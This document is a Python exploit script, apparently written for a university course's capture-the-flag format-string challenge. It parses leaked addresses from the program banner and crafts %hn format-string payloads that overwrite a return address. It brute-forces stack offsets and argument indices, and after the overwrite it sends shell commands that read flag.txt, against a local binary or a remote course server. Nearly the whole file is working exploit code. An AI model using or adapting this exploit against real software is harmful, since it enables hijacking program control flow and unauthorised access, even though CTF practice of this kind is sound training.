#!/usr/bin/env python3
"""Adaptive helper for return-overwrite format-string challenges.

Goal:
- work even if stack return offset, write argument positions, or write order changes
- keep payload under the ~32-byte input limit of most challenges

Default usage:
    python fs4.py

Typical remote usage:
    python fs4.py --mode remote --host moa6.eecs.utk.edu --port 32150

Typical local usage:
    python fs4.py --mode local --binary ./jump
"""

from __future__ import annotations

import argparse
import os
import select
import re
import secrets
import socket
import struct
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable

SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_BINARY = str(SCRIPT_DIR.parent / "formatstring4" / "jump")
HOST = "moa6.eecs.utk.edu"
PORT = 32150
FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)
GENERIC_FLAG_RE = re.compile(r"\b[a-z][a-z0-9_-]{1,32}\{[^}\n]{4,128}\}", re.IGNORECASE)
SUCCESS_WORD_RE = re.compile(
    r"\b(success|correct|accepted|solved|won|complete|congratulations)\b",
    re.IGNORECASE,
)
EXACT_LEAK_RE = re.compile(
    r"function\s+(?:0x)?([0-9a-fA-F]{7,8}),\s*(?:0x)?([0-9a-fA-F]{7,8})",
    re.IGNORECASE,
)
HEX_RE = re.compile(r"0x([0-9a-fA-F]{7,8})")
DEFAULT_CMD_TEMPLATE = "echo {token}\ncat flag.txt 2>/dev/null || true\nexit\n"
READY_TIMEOUT = 6.0
IDLE_TIMEOUT = 0.2
POST_TIMEOUT = 1.0


@dataclass(frozen=True)
class Attempt:
    ret_offset: int
    idx_a: int
    idx_b: int
    high_first: bool


def is_code_addr(value: int) -> bool:
    return 0x08000000 <= value < 0xF0000000


def is_stack_addr(value: int) -> bool:
    return 0xFF000000 <= value <= 0xFFFFFFFF


def parse_leaks(text: str) -> tuple[int, int]:
    """Extract target code address and stack buffer address from banner text."""
    m = EXACT_LEAK_RE.search(text)
    if m:
        return int(m.group(1), 16), int(m.group(2), 16)

    code_addr: int | None = None
    stack_addr: int | None = None

    for line in text.splitlines():
        vals = [int(m.group(1), 16) for m in HEX_RE.finditer(line)]
        if not vals:
            continue

        lower = line.lower()
        code_hint = any(k in lower for k in ("jump", "win", "target", "function"))
        stack_hint = any(k in lower for k in ("buf", "stack", "frame", "ebp"))

        for v in vals:
            if code_addr is None and is_code_addr(v) and (code_hint or not stack_hint):
                code_addr = v
            if (
                stack_addr is None
                and is_stack_addr(v)
                and (stack_hint or not code_hint)
            ):
                stack_addr = v

        if code_addr is not None and stack_addr is not None:
            return code_addr, stack_addr

    for m in HEX_RE.finditer(text):
        v = int(m.group(1), 16)
        if code_addr is None and is_code_addr(v):
            code_addr = v
        elif stack_addr is None and is_stack_addr(v):
            stack_addr = v
        if code_addr is not None and stack_addr is not None:
            return code_addr, stack_addr

    raise RuntimeError("failed to parse leaked code and stack addresses")


def iter_attempts(ret_offset_forced: int | None) -> Iterable[Attempt]:
    offsets = (
        [ret_offset_forced]
        if ret_offset_forced is not None
        else list(range(24, 121, 4))
    )
    arg_pairs = [(1, 2), (2, 1), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7)]
    for off in offsets:
        for idx_a, idx_b in arg_pairs:
            yield Attempt(off, idx_a, idx_b, True)
            yield Attempt(off, idx_a, idx_b, False)


def _fmt_write(total_printed: int, want: int, arg_idx: int) -> tuple[str, int]:
    delta = (want - total_printed) % 0x10000
    if delta == 0:
        part = f"%{arg_idx}$hn"
    else:
        part = f"%{delta}c%{arg_idx}$hn"
    total_printed = (total_printed + delta) % 0x10000
    return part, total_printed


def build_payload(
    target_addr: int, buffer_addr: int, attempt: Attempt
) -> tuple[bytes, dict[str, int]]:
    ret_addr = (buffer_addr + attempt.ret_offset) & 0xFFFFFFFF
    low = target_addr & 0xFFFF
    high = (target_addr >> 16) & 0xFFFF

    writes: list[tuple[int, int, int]]
    if attempt.high_first:
        writes = [
            (ret_addr + 2, high, attempt.idx_a),
            (ret_addr, low, attempt.idx_b),
        ]
    else:
        writes = [
            (ret_addr, low, attempt.idx_a),
            (ret_addr + 2, high, attempt.idx_b),
        ]

    prefix = struct.pack("<I", writes[0][0]) + struct.pack("<I", writes[1][0])
    printed = len(prefix)
    f1, printed = _fmt_write(printed, writes[0][1], writes[0][2])
    f2, printed = _fmt_write(printed, writes[1][1], writes[1][2])
    fmt = (f1 + f2).encode("ascii")
    payload = prefix + fmt

    info = {
        "target": target_addr,
        "buffer": buffer_addr,
        "ret_addr": ret_addr,
        "ret_offset": attempt.ret_offset,
        "idx_a": attempt.idx_a,
        "idx_b": attempt.idx_b,
        "high_first": int(attempt.high_first),
        "payload_len": len(payload),
        "addr_a": writes[0][0],
        "addr_b": writes[1][0],
        "want_a": writes[0][1],
        "want_b": writes[1][1],
    }
    return payload, info


def read_until_banner_local(proc: subprocess.Popen[bytes]) -> str:
    out = b""
    deadline = time.monotonic() + READY_TIMEOUT
    fd = None
    if proc.stdout is not None:
        fd = proc.stdout.fileno()
    while True:
        if proc.stdout is None or fd is None:
            raise RuntimeError("failed to open local stdout")
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
        if not ready:
            if out:
                break
            continue
        chunk = os.read(fd, 256)
        if not chunk:
            break
        out += chunk
        txt = out.decode("latin1", errors="ignore")
        try:
            parse_leaks(txt)
            return txt
        except RuntimeError:
            continue
    return out.decode("latin1", errors="ignore")


def read_until_banner_remote(sock: socket.socket) -> str:
    out = b""
    deadline = time.monotonic() + READY_TIMEOUT
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(min(IDLE_TIMEOUT, remaining))
        try:
            chunk = sock.recv(256)
        except socket.timeout:
            if out:
                break
            continue
        if not chunk:
            break
        out += chunk
        txt = out.decode("latin1", errors="ignore")
        try:
            parse_leaks(txt)
            return txt
        except RuntimeError:
            continue
    return out.decode("latin1", errors="ignore")


def read_tail_local(proc: subprocess.Popen[bytes], timeout: float = POST_TIMEOUT) -> str:
    if proc.stdout is None:
        return ""
    fd = proc.stdout.fileno()
    out = b""
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
        if not ready:
            if out:
                break
            continue
        chunk = os.read(fd, 4096)
        if not chunk:
            break
        out += chunk
    return out.decode("latin1", errors="ignore")


def read_tail_remote(sock: socket.socket, timeout: float = POST_TIMEOUT) -> str:
    out = b""
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(min(IDLE_TIMEOUT, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if out:
                break
            continue
        if not chunk:
            break
        out += chunk
    return out.decode("latin1", errors="ignore")


def run_local_once(binary: str, payload: bytes, cmd: bytes) -> str:
    p = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    banner = read_until_banner_local(p)
    if p.stdin is None or p.stdout is None:
        raise RuntimeError("failed to open local pipes")
    p.stdin.write(payload + cmd)
    p.stdin.flush()
    p.stdin.close()
    rest = p.stdout.read().decode("latin1", errors="ignore")
    return banner + rest


def run_remote_once(host: str, port: int, payload: bytes, cmd: bytes) -> str:
    sock = socket.create_connection((host, port), timeout=8)
    sock.settimeout(6)
    try:
        banner = read_until_banner_remote(sock)
        sock.sendall(payload + cmd)
        body = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                body += chunk
        except socket.timeout:
            pass
    finally:
        sock.close()
    return banner + body.decode("latin1", errors="ignore")


def looks_like_success(text: str, token: str | None = None) -> bool:
    if token and token in text:
        return True
    if FLAG_RE.search(text):
        return True
    if GENERIC_FLAG_RE.search(text):
        return True
    if SUCCESS_WORD_RE.search(text):
        return True
    return False


def trim_preview(text: str, max_chars: int = 400) -> str:
    if len(text) <= max_chars:
        return text
    return text[:max_chars] + "\n..."


def main() -> None:
    ap = argparse.ArgumentParser(
        description="adaptive format-string return-overwrite helper"
    )
    ap.add_argument(
        "--mode",
        choices=["auto", "local", "remote"],
        default="local",
        help="target mode (default: local)",
    )
    ap.add_argument(
        "--host", default=HOST, help="remote host (used when --mode remote or auto)"
    )
    ap.add_argument(
        "--port",
        type=int,
        default=PORT,
        help="remote port (used when --mode remote or auto)",
    )
    ap.add_argument("--binary", default=DEFAULT_BINARY)
    ap.add_argument("--ret-offset", type=int, default=None)
    ap.add_argument(
        "--cmd",
        default=None,
        help="post-overwrite command sequence; default auto-generates a per-run token + flag read",
    )
    ap.add_argument(
        "--max-seconds",
        type=float,
        default=12.0,
        help="overall search time budget in seconds (default: 12)",
    )
    ap.add_argument("--show-fail-preview", action="store_true")
    args = ap.parse_args()

    modes = [args.mode]
    if args.mode == "auto":
        modes = ["remote", "local"]

    success_token = f"AUTO_OK_{secrets.token_hex(6)}"
    cmd_text = args.cmd if args.cmd is not None else DEFAULT_CMD_TEMPLATE.format(token=success_token)
    cmd_bytes = cmd_text.encode("ascii", errors="ignore")

    last_error: Exception | None = None
    deadline = time.monotonic() + args.max_seconds
    for mode in modes:
        # Read one fresh banner per attempt because ASLR and stack layout can vary run-to-run.
        for attempt in iter_attempts(args.ret_offset):
            if time.monotonic() >= deadline:
                raise RuntimeError("exploit search timed out before finding success")
            try:
                if mode == "local":
                    # Open once to parse current leaks, then rerun that same process with payload.
                    p = subprocess.Popen(
                        [args.binary],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                    )
                    banner = read_until_banner_local(p)
                    target_addr, buffer_addr = parse_leaks(banner)
                    payload, info = build_payload(target_addr, buffer_addr, attempt)
                    if info["payload_len"] > 31:
                        if p.poll() is None:
                            p.kill()
                        continue
                    if p.stdin is None or p.stdout is None:
                        if p.poll() is None:
                            p.kill()
                        raise RuntimeError("failed to open local pipes")
                    p.stdin.write(payload + cmd_bytes)
                    p.stdin.flush()
                    p.stdin.close()
                    rest = read_tail_local(p)
                    if p.poll() is None:
                        p.kill()
                    output = banner + rest
                else:
                    sock = socket.create_connection((args.host, args.port), timeout=8)
                    try:
                        banner = read_until_banner_remote(sock)
                        target_addr, buffer_addr = parse_leaks(banner)
                        payload, info = build_payload(target_addr, buffer_addr, attempt)
                        if info["payload_len"] > 31:
                            continue
                        sock.sendall(payload + cmd_bytes)
                        body = read_tail_remote(sock)
                        output = banner + body
                    finally:
                        sock.close()

                print(
                    "[*] mode=%s ret_off=%d idx=(%d,%d) order=%s len=%d"
                    % (
                        mode,
                        info["ret_offset"],
                        info["idx_a"],
                        info["idx_b"],
                        "high-first" if info["high_first"] else "low-first",
                        info["payload_len"],
                    )
                )

                if looks_like_success(output, success_token):
                    print(output)
                    return

                if args.show_fail_preview:
                    print(trim_preview(output))
            except Exception as exc:
                last_error = exc
                continue

    if last_error is not None:
        raise last_error
    raise RuntimeError("exploit failed: no successful attempt matched")


if __name__ == "__main__":
    main()
